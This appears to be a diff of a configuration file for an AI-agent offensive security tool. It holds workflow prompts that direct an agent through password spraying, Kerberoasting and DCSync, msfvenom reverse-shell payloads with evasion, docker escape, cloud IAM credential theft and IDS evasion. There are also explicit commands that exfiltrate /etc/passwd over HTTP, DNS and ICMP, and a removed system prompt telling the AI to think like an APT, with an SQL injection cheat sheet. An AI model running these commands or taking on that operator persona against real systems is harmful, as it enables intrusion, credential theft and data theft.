+        "description": "Hydra + crackmapexec -- spray with lockout awareness",
         "prompt": (
-            "Run elite password spraying against: {target}.\n"
-            "Phase 1: nmap -sV -p 21,22,23,25,80,110,143,389,443,445,3306,3389,5900,8080 {target}.\n"
-            "Phase 2: Check password policy before spraying -- enum4linux or crackmapexec to get lockout threshold.\n"
-            "Phase 3: Spray with lockout-safe timing -- max 1 attempt per user per 30 minutes if policy unknown.\n"
-            "Phase 4: SSH spray: hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /tmp/top20.txt ssh://{target} -t 4 -W 30.\n"
-            "Phase 5: SMB spray: crackmapexec smb {target} -u users.txt -p passwords.txt --continue-on-success.\n"
-            "Phase 6: Any valid credentials -- immediately test across all other services in session findings.\n"
-            "Phase 7: If domain environment found use crackmapexec with --no-bruteforce for single password spray.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to track attempts and avoid lockout."
+            "Password spraying against: {target}.\n"
+            "Phase 1: nmap -sV -p 21,22,80,443,445,3389 {target}.\n"
+            "Phase 2: Check password policy with enum4linux or crackmapexec before spraying.\n"
+            "Phase 3: Spray SSH with hydra respecting lockout timing.\n"
+            "Phase 4: Spray SMB with crackmapexec --continue-on-success.\n"
+            "Phase 5: Any valid creds -- immediately test across ALL other services.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "8": {
         "name": "Active Directory Recon",
         "description": "Full AD kill chain -- enum to DCSync",
         "prompt": (
-            "Run elite Active Directory attack chain against: {target}.\n"
-            "Phase 1: enum4linux -a {target} for users groups shares policies.\n"
-            "Phase 2: crackmapexec smb {target} --users --groups --shares --pass-pol.\n"
-            "Phase 3: impacket-GetADUsers -all -dc-ip {target} domain/user or anonymous.\n"
-            "Phase 4: impacket-GetNPUsers -dc-ip {target} -usersfile users.txt -no-pass for AS-REP roasting -- cracks offline.\n"
-            "Phase 5: impacket-GetUserSPNs -dc-ip {target} for Kerberoastable SPNs -- cracks offline.\n"
-            "Phase 6: If any hashes obtained run hashcat -m 18200 for AS-REP or -m 13100 for Kerberoast.\n"
-            "Phase 7: If credentials exist try impacket-secretsdump for DCSync.\n"
-            "Phase 8: Check for ADCS with certipy find if available -- ESC1-ESC8 vulnerabilities.\n"
-            "Phase 9: Check for Zerologon: nmap -p 445 --script smb-vuln-zerologon {target}.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to map the AD kill chain path."
+            "Elite AD attack chain against: {target}.\n"
+            "Phase 1: enum4linux -a {target}.\n"
+            "Phase 2: crackmapexec smb {target} --users --groups --pass-pol.\n"
+            "Phase 3: impacket-GetNPUsers -dc-ip {target} -no-pass for AS-REP roasting.\n"
+            "Phase 4: impacket-GetUserSPNs -dc-ip {target} for Kerberoasting.\n"
+            "Phase 5: Crack any hashes obtained with hashcat.\n"
+            "Phase 6: If creds found try impacket-secretsdump for DCSync.\n"
+            "Phase 7: Check certipy for ADCS vulnerabilities.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "9": {
         "name": "Payload Generation",
-        "description": "msfvenom elite payloads with evasion and staged listener",
+        "description": "msfvenom staged stageless payloads + auto listener",
         "prompt": (
-            "Generate elite attack payloads for: {target}.\n"
-            "Phase 1: Detect LHOST: hostname -I | awk '{print $1}'.\n"
-            "Phase 2: Windows x64 staged: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=4444 -f exe -e x64/xor_dynamic -i 5 -o /tmp/shell.exe.\n"
-            "Phase 3: Windows x64 stageless for AV evasion: msfvenom -p windows/x64/meterpreter_reverse_https LHOST=[LHOST] LPORT=443 -f exe -o /tmp/shell_stageless.exe.\n"
-            "Phase 4: Linux ELF: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=4445 -f elf -o /tmp/shell.elf.\n"
-            "Phase 5: PHP webshell: msfvenom -p php/meterpreter_reverse_tcp LHOST=[LHOST] LPORT=4446 -f raw -o /tmp/shell.php.\n"
-            "Phase 6: Write and launch multi/handler resource script with exit at end.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to select payload for target platform."
+            "Generate payloads for: {target}.\n"
+            "Phase 1: Get LHOST: hostname -I | awk '{print $1}'\n"
+            "Phase 2: Windows x64: msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=4444 -f exe -e x64/xor_dynamic -i 5 -o /tmp/shell.exe\n"
+            "Phase 3: Linux ELF: msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=[LHOST] LPORT=4445 -f elf -o /tmp/shell.elf\n"
+            "Phase 4: PHP: msfvenom -p php/meterpreter_reverse_tcp LHOST=[LHOST] LPORT=4446 -f raw -o /tmp/shell.php\n"
+            "Phase 5: Write multi/handler resource script with exit as last line and launch.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "10": {
         "name": "Bluetooth Recon",
-        "description": "hcitool + sdptool -- BT device discovery and service enum",
+        "description": "hcitool + sdptool -- BT device discovery",
         "prompt": (
-            "Run Bluetooth reconnaissance. Interface/area: {target}.\n"
-            "Phase 1: hciconfig -a to list all Bluetooth interfaces.\n"
-            "Phase 2: hcitool scan for classic Bluetooth devices.\n"
-            "Phase 3: timeout 15 hcitool lescan for BLE devices.\n"
-            "Phase 4: sdptool browse [MAC] for each discovered device.\n"
-            "Phase 5: l2ping [MAC] to test connectivity to targets.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to identify attack surface."
+            "Bluetooth recon. Interface: {target}.\n"
+            "Phase 1: hciconfig -a list interfaces.\n"
+            "Phase 2: hcitool scan classic devices.\n"
+            "Phase 3: timeout 15 hcitool lescan BLE devices.\n"
+            "Phase 4: sdptool browse [MAC] for each device.\n"
+            "Phase 5: l2ping [MAC] connectivity test.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "11": {
         "name": "OSINT Profiling",
-        "description": "Full passive intelligence gathering",
+        "description": "theHarvester + whois + dig -- passive intel",
         "prompt": (
-            "Run elite OSINT against: {target}.\n"
-            "Phase 1: whois {target} for registration data and name servers.\n"
-            "Phase 2: dig {target} ANY +noall +answer for all DNS records.\n"
-            "Phase 3: theHarvester -d {target} -b google,bing,crtsh,yahoo -l 500.\n"
-            "Phase 4: curl -s 'https://crt.sh/?q=%25.{target}&output=json' | python3 -c 'import json,sys;[print(x[\"name_value\"]) for x in json.load(sys.stdin)]' for cert transparency.\n"
-            "Phase 5: For every subdomain found -- nmap quick scan to find live ones.\n"
-            "Phase 6: Check for exposed .git repos: curl -s {target}/.git/HEAD.\n"
-            "Phase 7: Google dork: site:{target} filetype:pdf OR filetype:xls OR filetype:doc.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to map the full attack surface."
+            "Passive OSINT against: {target}.\n"
+            "Phase 1: whois {target}.\n"
+            "Phase 2: dig {target} ANY +noall +answer.\n"
+            "Phase 3: theHarvester -d {target} -b google,bing,crtsh -l 500.\n"
+            "Phase 4: curl -s 'https://crt.sh/?q=%25.{target}&output=json' for cert transparency.\n"
+            "Phase 5: Probe each discovered subdomain with whatweb.\n"
+            "Phase 6: Check for exposed .git repos.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "12": {
         "name": "SSL/TLS Audit",
-        "description": "Full cipher and certificate vulnerability assessment",
+        "description": "sslscan + testssl.sh + sslyze -- full cipher audit",
         "prompt": (
-            "Run full SSL/TLS audit against: {target}.\n"
-            "Phase 1: sslscan {target} for protocols ciphers and certificate details.\n"
-            "Phase 2: testssl.sh --severity MEDIUM {target} for BEAST POODLE Heartbleed ROBOT CRIME.\n"
-            "Phase 3: sslyze --regular {target} for OCSP stapling and session resumption.\n"
-            "Phase 4: openssl s_client -connect {target}:443 to inspect certificate chain manually.\n"
-            "Phase 5: Check for weak DH params: nmap --script ssl-dh-params {target}.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to explain exploitability of each finding."
+            "SSL/TLS audit against: {target}.\n"
+            "Phase 1: sslscan {target}.\n"
+            "Phase 2: testssl.sh --severity MEDIUM {target}.\n"
+            "Phase 3: sslyze --regular {target}.\n"
+            "Phase 4: openssl s_client -connect {target}:443 manual inspect.\n"
+            "Phase 5: nmap --script ssl-dh-params {target}.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "13": {
-        "name": "DNS Enumeration & Attack",
-        "description": "Zone transfer brute-force cache poison check",
+        "name": "DNS Enumeration",
+        "description": "dnsrecon + fierce + dnsenum -- zone transfer brute-force",
         "prompt": (
-            "Run elite DNS attack assessment against: {target}.\n"
-            "Phase 1: dnsrecon -d {target} -t std for full record enumeration.\n"
-            "Phase 2: dnsrecon -d {target} -t axfr to attempt zone transfer.\n"
-            "Phase 3: fierce --domain {target} for subdomain brute-force.\n"
-            "Phase 4: dnsenum {target} for additional subdomain and host discovery.\n"
-            "Phase 5: nmap -p 53 --script dns-recursion {target} to check for open resolver.\n"
-            "Phase 6: For all discovered hosts add to target list and fingerprint.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to identify misconfigurations."
+            "DNS enumeration against: {target}.\n"
+            "Phase 1: dnsrecon -d {target} -t std.\n"
+            "Phase 2: dnsrecon -d {target} -t axfr zone transfer attempt.\n"
+            "Phase 3: fierce --domain {target} subdomain brute-force.\n"
+            "Phase 4: dnsenum {target}.\n"
+            "Phase 5: nmap -p 53 --script dns-recursion {target} open resolver check.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "14": {
         "name": "SMB Attack",
-        "description": "EternalBlue check -> share enum -> relay candidate -> SAM dump",
+        "description": "EternalBlue check -> enum -> relay candidate -> SAM dump",
         "prompt": (
-            "Run elite SMB attack chain against: {target}.\n"
-            "Phase 1: nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796 {target} for EternalBlue and SMBGhost.\n"
-            "Phase 2: smbclient -L {target} -N for anonymous share enumeration.\n"
-            "Phase 3: crackmapexec smb {target} --shares for share permissions.\n"
-            "Phase 4: enum4linux -a {target} for users groups and password policy.\n"
-            "Phase 5: Check SMB signing: crackmapexec smb {target} -- if signing false it is relay candidate.\n"
-            "Phase 6: If credentials in findings: crackmapexec smb {target} -u [user] -p [pass] --sam.\n"
-            "Phase 7: If NTLM hash in findings: crackmapexec smb {target} -u [user] -H [hash] --sam.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to chain into lateral movement."
+            "SMB attack chain against: {target}.\n"
+            "Phase 1: nmap -p 445 --script smb-vuln-ms17-010,smb-vuln-cve-2020-0796 {target}.\n"
+            "Phase 2: smbclient -L {target} -N anonymous enum.\n"
+            "Phase 3: crackmapexec smb {target} --shares.\n"
+            "Phase 4: enum4linux -a {target}.\n"
+            "Phase 5: Check SMB signing -- if disabled note as relay candidate.\n"
+            "Phase 6: If creds in findings: crackmapexec smb {target} -u [user] -p [pass] --sam.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "15": {
         "name": "API Security Testing",
-        "description": "Endpoint discovery auth bypass IDOR injection JWT attacks",
+        "description": "ffuf + arjun + curl -- endpoint discovery auth bypass injection",
         "prompt": (
-            "Run elite API security assessment against: {target}.\n"
-            "Phase 1: curl -I {target} to fingerprint and check security headers.\n"
-            "Phase 2: ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,204,301,302,403 -v.\n"
-            "Phase 3: arjun -u {target} to discover hidden parameters.\n"
-            "Phase 4: Test IDOR -- find any numeric ID in URL or body and increment/decrement to access other users data.\n"
-            "Phase 5: Test auth bypass -- send requests without Authorization header or with empty bearer token.\n"
-            "Phase 6: If JWT found -- decode with: echo [token] | cut -d. -f2 | base64 -d -- check for alg:none and weak secret.\n"
-            "Phase 7: Test for SSRF in any URL parameter: set value to http://169.254.169.254/latest/meta-data/.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to chain vulnerabilities."
+            "API security testing against: {target}.\n"
+            "Phase 1: curl -I {target} headers fingerprint.\n"
+            "Phase 2: ffuf -u {target}/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,201,204,301,302,403.\n"
+            "Phase 3: arjun -u {target} hidden parameters.\n"
+            "Phase 4: IDOR test -- manipulate numeric IDs in endpoints.\n"
+            "Phase 5: Auth bypass -- requests without Authorization header.\n"
+            "Phase 6: JWT decode and test: echo [token] | cut -d. -f2 | base64 -d\n"
+            "Phase 7: SSRF test in URL params: http://169.254.169.254/latest/meta-data/\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "16": {
         "name": "Linux Privilege Escalation",
-        "description": "linpeas + GTFOBins + kernel exploits -- full root path",
+        "description": "linpeas + GTFOBins + kernel exploits",
         "prompt": (
-            "Run elite Linux privilege escalation on current host.\n"
-            "Phase 1: Download linpeas if not present: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lpe.sh && chmod +x /tmp/lpe.sh.\n"
-            "Phase 2: /tmp/lpe.sh 2>/dev/null | tee /tmp/lpe_out.txt -- save full output.\n"
-            "Phase 3: linux-exploit-suggester 2>/dev/null for kernel CVEs.\n"
-            "Phase 4: For every SUID binary found -- check GTFOBins for exploitation method.\n"
-            "Phase 5: Check sudo -l -- for any NOPASSWD entry check GTFOBins immediately.\n"
-            "Phase 6: Check for writable cron script paths and replace with reverse shell.\n"
-            "Phase 7: Check capabilities: getcap -r / 2>/dev/null.\n"
-            "Phase 8: Check for docker group: id | grep docker -- if yes instant root via docker run -v /:/mnt.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to prioritize fastest root path."
+            "Linux privilege escalation on current host.\n"
+            "Phase 1: Download linpeas if not present: curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o /tmp/lpe.sh && chmod +x /tmp/lpe.sh\n"
+            "Phase 2: /tmp/lpe.sh 2>/dev/null | tee /tmp/lpe_out.txt\n"
+            "Phase 3: linux-exploit-suggester for kernel CVEs.\n"
+            "Phase 4: GTFOBins every SUID and sudo entry found.\n"
+            "Phase 5: getcap -r / 2>/dev/null capabilities.\n"
+            "Phase 6: id | grep docker -- if yes instant root.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "17": {
         "name": "Windows Privilege Escalation",
-        "description": "Full Windows privesc -- services tokens registry UAC",
+        "description": "winpeas + token abuse + service misconfigs",
         "prompt": (
-            "Run elite Windows privilege escalation. Target: {target}.\n"
-            "Phase 1: systeminfo | findstr /B /C:'OS Name' /C:'OS Version' /C:'Hotfix'.\n"
-            "Phase 2: whoami /priv -- if SeImpersonatePrivilege enabled use PrintSpoofer or GodPotato.\n"
-            "Phase 3: wmic service get name,pathname,startmode | findstr /i 'auto' | findstr /i /v 'c:\\windows' for unquoted paths.\n"
-            "Phase 4: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated.\n"
-            "Phase 5: reg query HKLM\\SYSTEM\\CurrentControlSet\\Services for weak service permissions.\n"
-            "Phase 6: cmdkey /list for cached credentials.\n"
-            "Phase 7: Check startup folder: dir 'C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup'.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to identify fastest SYSTEM path."
+            "Windows privilege escalation. Target: {target}.\n"
+            "Phase 1: systeminfo OS version and patches.\n"
+            "Phase 2: whoami /priv -- SeImpersonatePrivilege = use PrintSpoofer or GodPotato.\n"
+            "Phase 3: wmic service get name,pathname for unquoted service paths.\n"
+            "Phase 4: reg query AlwaysInstallElevated.\n"
+            "Phase 5: cmdkey /list stored credentials.\n"
+            "Phase 6: Deliver winpeas via msfvenom or certutil download.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "18": {
         "name": "Lateral Movement",
-        "description": "Pass-the-hash pass-the-ticket DCSync pivoting",
+        "description": "pass-the-hash -> wmiexec -> DCSync -> pivoting",
         "prompt": (
-            "Run elite lateral movement from current position toward: {target}.\n"
-            "Phase 1: crackmapexec smb {target}/24 with any credentials or hashes from session findings.\n"
-            "Phase 2: If NTLM hash available: impacket-psexec [domain]/[user]@{target} -hashes :[hash].\n"
-            "Phase 3: impacket-wmiexec as stealth alternative to psexec.\n"
-            "Phase 4: impacket-smbexec if psexec and wmiexec are blocked.\n"
-            "Phase 5: If Kerberos ticket available: export KRB5CCNAME=[ticket] and use -k flag.\n"
-            "Phase 6: For deep pivoting: ssh -D 1080 user@pivot_host then proxychains.\n"
-            "Phase 7: If DA credentials found: impacket-secretsdump [domain]/[DA]@[DC_IP] for full DCSync.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to map path and reuse all session findings."
+            "Lateral movement toward: {target}.\n"
+            "Phase 1: crackmapexec smb {target}/24 with creds or hashes from findings.\n"
+            "Phase 2: If NTLM hash: impacket-psexec [user]@{target} -hashes :[hash].\n"
+            "Phase 3: impacket-wmiexec as stealth alternative.\n"
+            "Phase 4: impacket-smbexec if others blocked.\n"
+            "Phase 5: klist for Kerberos tickets -- use -k flag if found.\n"
+            "Phase 6: If DA creds: impacket-secretsdump for full DCSync.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "19": {
         "name": "Container & Cloud Escape",
-        "description": "Docker escape cloud metadata IAM credential theft",
+        "description": "docker socket -> cloud metadata -> IAM theft",
         "prompt": (
-            "Run elite container and cloud escape assessment on: {target}.\n"
-            "Phase 1: cat /proc/1/cgroup && cat /.dockerenv 2>/dev/null to confirm container.\n"
-            "Phase 2: ls -la /var/run/docker.sock -- if exists instant host escape via docker run.\n"
-            "Phase 3: Docker socket escape: docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host.\n"
-            "Phase 4: curl -s -m 3 http://169.254.169.254/latest/meta-data/ for AWS IMDS.\n"
-            "Phase 5: curl -s http://169.254.169.254/latest/meta-data/iam/security-credentials/ for IAM role name then dump keys.\n"
-            "Phase 6: curl -s -H 'Metadata-Flavor: Google' http://metadata.google.internal/computeMetadata/v1/instance/ for GCP.\n"
-            "Phase 7: kubectl auth can-i --list 2>/dev/null for cluster permission enumeration.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to identify and execute escape path."
+            "Container and cloud assessment on: {target}.\n"
+            "Phase 1: cat /proc/1/cgroup && ls /.dockerenv 2>/dev/null confirm container.\n"
+            "Phase 2: ls -la /var/run/docker.sock -- if exists instant escape.\n"
+            "Phase 3: docker socket escape: docker -H unix:///var/run/docker.sock run -it -v /:/host alpine chroot /host\n"
+            "Phase 4: curl -s -m 3 http://169.254.169.254/latest/meta-data/ AWS IMDS.\n"
+            "Phase 5: Dump IAM credentials from metadata.\n"
+            "Phase 6: kubectl auth can-i --list cluster permissions.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "20": {
         "name": "IDS/IPS Evasion",
-        "description": "MAC spoof fragmentation decoys timing -- full stealth recon",
+        "description": "MAC spoof -> fragment -> decoys -> timing -> source port",
         "prompt": (
-            "Run fully evasive reconnaissance against: {target}.\n"
-            "Phase 1: ip link show to find interface then macchanger -r [iface] to randomize MAC.\n"
-            "Phase 2: nmap -T1 --scan-delay 10s -p 22,80,443,445,3389 {target} for ultra-slow scan.\n"
-            "Phase 3: nmap -f --mtu 8 -p 22,80,443 {target} for packet fragmentation.\n"
-            "Phase 4: nmap -D RND:15 --data-length 25 {target} for decoys with random padding.\n"
-            "Phase 5: nmap --source-port 53 -sU -p 53 {target} to mimic DNS.\n"
-            "Phase 6: nmap --source-port 80 {target} to mimic HTTP traffic.\n"
-            "Phase 7: Compare all results -- note differences indicating IDS filtering.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to assess stealth at each phase."
+            "Evasive recon against: {target}.\n"
+            "Phase 1: ip link show then macchanger -r [iface] randomize MAC.\n"
+            "Phase 2: nmap -T1 --scan-delay 10s common ports slow scan.\n"
+            "Phase 3: nmap -f --mtu 8 fragment packets.\n"
+            "Phase 4: nmap -D RND:15 --data-length 25 decoys with padding.\n"
+            "Phase 5: nmap --source-port 53 mimic DNS traffic.\n"
+            "Phase 6: Compare results to identify what IDS filtered.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "21": {
         "name": "Data Exfiltration",
-        "description": "DNS HTTP ICMP covert channels -- bypass DLP and firewalls",
+        "description": "DNS/HTTP/ICMP covert channels -- bypass DLP",
         "prompt": (
-            "Set up covert exfiltration from compromised host toward: {target}.\n"
-            "Phase 1: curl -s https://icanhazip.com and ping 8.8.8.8 -c 2 to test outbound.\n"
-            "Phase 2: Test HTTPS outbound: curl -s https://www.google.com -o /dev/null -w '%{http_code}'.\n"
-            "Phase 3: HTTP POST exfil: curl -X POST -F 'file=@/etc/passwd' http://{target}/upload.\n"
-            "Phase 4: DNS exfil: for chunk in $(cat /etc/passwd | base64 | fold -w 30); do nslookup $chunk.{target}; done.\n"
-            "Phase 5: ICMP exfil: ping -p $(xxd -p /etc/passwd | head -c 16) {target} -c 1.\n"
-            "Phase 6: If HTTPS allowed -- use curl with custom User-Agent to blend with normal traffic.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to select lowest-detection channel."
+            "Covert exfiltration from host toward: {target}.\n"
+            "Phase 1: curl -s https://icanhazip.com && ping 8.8.8.8 -c 2 test outbound.\n"
+            "Phase 2: Test HTTPS: curl -s https://www.google.com -o /dev/null -w '%{http_code}'\n"
+            "Phase 3: HTTP POST exfil: curl -X POST -F 'file=@/etc/passwd' http://{target}/collect\n"
+            "Phase 4: DNS exfil: for chunk in $(cat /etc/passwd|base64|fold -w30); do nslookup $chunk.{target}; done\n"
+            "Phase 5: ICMP exfil if allowed: ping -p $(xxd -p /etc/passwd|head -c16) {target} -c1\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "22": {
         "name": "Forensics & Evidence Collection",
-        "description": "Memory disk firmware analysis with chain of custody",
+        "description": "volatility + binwalk + strings -- memory and firmware",
         "prompt": (
-            "Run forensic analysis on: {target}.\n"
-            "Phase 1: file {target} and strings {target} | head -200 to identify and extract data.\n"
-            "Phase 2: sha256sum {target} for evidence integrity hash -- record this first.\n"
-            "Phase 3: binwalk {target} for embedded files and firmware signatures.\n"
-            "Phase 4: If memory dump: volatility3 -f {target} windows.info 2>/dev/null || volatility -f {target} imageinfo.\n"
-            "Phase 5: Extract process list: volatility3 -f {target} windows.pslist.\n"
-            "Phase 6: Extract network connections: volatility3 -f {target} windows.netstat.\n"
-            "Phase 7: binwalk -e {target} to carve and extract all embedded files.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to build forensic timeline."
+            "Forensic analysis on: {target}.\n"
+            "Phase 1: sha256sum {target} record integrity hash first.\n"
+            "Phase 2: file {target} && strings {target} | head -200.\n"
+            "Phase 3: binwalk {target} for embedded files.\n"
+            "Phase 4: If memory dump: volatility3 -f {target} windows.info 2>/dev/null || volatility -f {target} imageinfo\n"
+            "Phase 5: volatility3 windows.pslist and windows.netstat.\n"
+            "Phase 6: binwalk -e {target} extract all embedded content.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
     "23": {
         "name": "Steganography Analysis",
-        "description": "steghide zsteg exiftool binwalk -- find all hidden data",
+        "description": "steghide + zsteg + exiftool -- find hidden data",
         "prompt": (
-            "Run elite steganography analysis on: {target}.\n"
-            "Phase 1: file {target} to confirm file type -- extension may be misleading.\n"
-            "Phase 2: exiftool {target} for metadata anomalies and GPS data.\n"
-            "Phase 3: strings {target} | grep -iE 'flag|key|pass|secret|htb|thm|root|admin'.\n"
-            "Phase 4: steghide extract -sf {target} -p '' for empty passphrase.\n"
-            "Phase 5: steghide extract -sf {target} -p 'password' -- try common passwords.\n"
-            "Phase 6: zsteg -a {target} for all LSB techniques on PNG/BMP.\n"
-            "Phase 7: binwalk -e {target} to extract all appended data.\n"
-            "Phase 8: xxd {target} | tail -50 to inspect raw bytes at end of file for appended content.\n"
-            "Issue one [CMD] at a time. Use [THOUGHT] to reason from file type to best technique."
+            "Steganography analysis on: {target}.\n"
+            "Phase 1: file {target} confirm real type.\n"
+            "Phase 2: exiftool {target} metadata.\n"
+            "Phase 3: strings {target} | grep -iE 'flag|key|pass|secret|htb|thm'\n"
+            "Phase 4: steghide extract -sf {target} -p ''\n"
+            "Phase 5: zsteg -a {target} for PNG/BMP LSB.\n"
+            "Phase 6: binwalk -e {target} extract appended data.\n"
+            "Phase 7: xxd {target} | tail -50 inspect raw bytes.\n"
+            "One [CMD] at a time. WORKFLOW_COMPLETE when done."
         ),
     },
 }
 
 
 # ─────────────────────────────────────────────────────────────
-# ELITE KNOWLEDGE BASE — THE BRAIN
+# SYSTEM PROMPT
 # ─────────────────────────────────────────────────────────────
 
-ELITE_KNOWLEDGE = r"""
-══════════════════════════════════════════════════════
-ATHENA ELITE SECURITY KNOWLEDGE BASE v5.0
-══════════════════════════════════════════════════════
-
-You are not a tool runner. You are an elite offensive security operator with
-the combined knowledge of a senior penetration tester, red team operator,
-exploit developer, and threat intelligence analyst. You think like an APT.
-Every decision is deliberate, every command is chosen for a reason.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 1: ELITE MINDSET AND METHODOLOGY
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-OBJECTIVE-FIRST THINKING:
-Before any command ask: what is the goal, what is the minimum path to it,
-what could this action trigger, what is the fallback if it fails.
-Never run a command just because it is the next step in a checklist.
-Every command must advance the mission.
-
-ATTACK SURFACE THINKING:
-Every system has: network exposure, application layer, authentication,
-trust relationships, third-party integrations, human factors.
-Map all of these before exploiting any of them.
-The easiest path is rarely the most obvious one.
-
-TRUST BOUNDARY ANALYSIS:
-Ask on every engagement: what trusts what?
-A web server trusted by a database is a pivot path.
-A service account trusted by Active Directory is a privilege path.
-A developer machine trusted by CI/CD is a supply chain path.
-Map trust relationships before targeting individual hosts.
-
-DETECTION AWARENESS:
-Every action has a noise level. Know it before acting.
-LOUD: nmap full scan, hydra brute force, metasploit exploits, mimikatz
-MEDIUM: nmap service scan, gobuster, enum4linux, searchsploit queries
-QUIET: single curl requests, passive DNS, OSINT, reading files already accessible
-SILENT: analyzing output already captured, planning, calculating next move
-Choose noise level appropriate to the environment and your objective.
-
-FALLBACK PLANNING:
-Always have three approaches for every objective.
-If nmap is blocked use masscan. If masscan is blocked use netcat.
-If direct exploitation fails use credential attacks.
-If credential attacks fail use social engineering paths.
-Never have only one plan.
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 2: NETWORK RECON ELITE TECHNIQUES
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-HOST DISCOVERY WITHOUT NMAP:
-  netdiscover -r 192.168.1.0/24          # ARP based discovery
-  for i in {1..254}; do ping -c1 -W1 192.168.1.$i &>/dev/null && echo "192.168.1.$i up"; done
-  fping -ag 192.168.1.0/24 2>/dev/null   # fast ping sweep
-
-PORT SCANNING ALTERNATIVES:
-  masscan -p1-65535 --rate=1000 [IP]     # fastest scanner
-  nc -zv [IP] 22 80 443 445 2>&1         # basic netcat check
-  nmap -sS -T4 --min-rate 5000 [IP]      # fast SYN scan
-
-SERVICE FINGERPRINTING DEEP:
-  nmap -sV --version-intensity 9 [IP]    # maximum version detection
-  nmap -A [IP]                           # aggressive: OS + version + scripts + traceroute
-  nc -nv [IP] [PORT]                     # manual banner grab
-  telnet [IP] [PORT]                     # alternative banner grab
-
-NMAP SCRIPT CATEGORIES TO ALWAYS CONSIDER:
-  --script vuln           # all vulnerability scripts
-  --script safe           # safe enumeration scripts
-  --script auth           # authentication bypass scripts
-  --script smb-*          # all SMB scripts
-  --script http-*         # all HTTP scripts
-  --script ssl-*          # all SSL/TLS scripts
-  --script dns-*          # all DNS scripts
-
-FIREWALL AND IDS DETECTION:
-  nmap -sA [IP]           # ACK scan to detect filtered vs closed ports
-  nmap --reason [IP]      # see why each port is in its state
-  nmap -f [IP]            # fragment packets to bypass simple inspection
-  hping3 -S -p 80 [IP]    # manual TCP SYN probe
-
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-SECTION 3: WEB APPLICATION ELITE TECHNIQUES
-━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-
-MANUAL TESTING BEFORE AUTOMATED TOOLS:
-Always manually browse the application first. Automated tools miss:
-  - Business logic flaws
-  - Multi-step vulnerabilities
-  - Context-dependent issues
-  - Race conditions
-
-RESPONSE ANALYSIS FRAMEWORK:
-Compare responses for: status code changes, body length changes,
-response time differences, error message differences, redirect behavior.
-A 1ms vs 500ms response difference on login = timing-based user enumeration.
-A 200 vs 302 on admin path with tampered cookie = auth bypass.
-
-INJECTION POINTS TO TEST MANUALLY:
-  Every URL parameter: ?id=1 ?user=admin ?page=home
-  Every form field including hidden fields
-  Every HTTP header: User-Agent Referer X-Forwarded-For Cookie
-  Every JSON/XML body field
-  File upload filenames and content types
-
-SQL INJECTION CHEAT SHEET:
-  Basic test: ' OR '1'='1'--
-  Time-based: ' OR SLEEP(5)--   (MySQL)  ' OR pg_sleep(5)--  (Postgres)
-  Error-based: ' AND extractvalue(1,concat(0x7e,version()))--
-  UNION: ' UNION SELECT NULL,NULL,NULL--  (increment NULLs until no error)
